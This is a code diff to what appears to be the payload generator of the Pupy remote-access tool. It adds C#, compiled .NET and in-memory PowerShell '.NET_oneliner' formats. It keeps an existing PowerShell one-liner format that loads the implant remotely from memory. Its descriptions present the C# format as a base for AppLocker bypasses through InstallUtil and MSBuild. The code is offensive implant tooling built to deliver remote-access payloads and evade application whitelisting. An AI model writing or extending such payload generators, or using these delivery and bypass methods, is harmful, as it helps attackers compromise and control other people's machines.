@@ -30,7 +30,7 @@ from io import BytesIO
 
 from pupylib.utils.network import get_listener_ip, get_listener_port
 from pupylib.utils.jarsigner import jarsigner
-from pupylib.payloads import dependencies
+from pupylib.payloads import dependencies, dotnet
 from pupylib.payloads.py_oneliner import serve_payload, pack_py_payload, getLinuxImportedModules
 from pupylib.payloads.rubber_ducky import rubber_ducky
 from pupylib.utils.obfuscate import compress_encode_obfs
@@ -488,7 +488,7 @@ class InvalidOptions(Exception):
     pass
 
 PAYLOAD_FORMATS = [
-    'client', 'py', 'pyinst', 'py_oneliner', 'ps1', 'ps1_oneliner', 'rubber_ducky'
+    'client', 'py', 'pyinst', 'py_oneliner', 'ps1', 'ps1_oneliner', 'rubber_ducky', 'csharp', '.NET', '.NET_oneliner'
 ]
 
 CLIENT_OS = ['android', 'windows', 'linux', 'solaris']
@@ -550,7 +550,10 @@ def pupygen(args, config, pupsrv, display):
                 'py': 'fully packaged python file',
                 'py_oneliner': 'same as \'py\' format but served over http',
                 'ps1': 'generate ps1 file which embeds pupy dll (x86-x64) and inject it to current process',
-                'ps1_oneliner': 'load pupy remotely from memory with a single command line using powershell'
+                'ps1_oneliner': 'load pupy remotely from memory with a single command line using powershell',
+                'csharp' : 'generate C# source that executes pupy. This source can be used to craft various applocker bypasses (ex: InstallUtil, MSBuild, ...)',
+                '.NET' : 'compile a C# payload into a windows executable.',
+                '.NET_oneliner' : 'Loads .NET assembly from memory via powershell'
             }.iteritems()], ['FORMAT', 'DESCRIPTION'], Color('Available formats (usage: -f <format>)', 'yellow')),
 
             Table([{
@@ -728,6 +731,25 @@ def pupygen(args, config, pupsrv, display):
         link_ip = conf["launcher_args"][i].split(":",1)[0]
 
         serve_payload(display, pupsrv, packed_payload, link_ip=link_ip)
+
+        raise NoOutput()
+
+    elif args.format == 'csharp':
+        if args.os!="windows" or args.arch!="x64":
+            raise ValueError("This format only support windows x64. x86 payloads are not implemented")
+        dn=dotnet.DotNetPayload(display, conf, outpath=outpath, output_dir=args.output_dir)
+        outpath = dn.gen_source()
+    elif args.format == '.NET':
+        if args.os!="windows" or args.arch!="x64":
+            raise ValueError("This format only support windows x64. x86 payloads are not implemented")
+        dn=dotnet.DotNetPayload(display, conf, outpath=outpath, output_dir=args.output_dir)
+        outpath = dn.gen_exe()
+        if outpath is None:
+            raise NoOutput()
+    elif args.format == '.NET_oneliner':
+        i = conf["launcher_args"].index("--host")+1
+        link_ip = conf["launcher_args"][i].split(":",1)[0]
+        dotnet.serve_payload(display, pupsrv, conf, link_ip=link_ip)
 
         raise NoOutput()
 
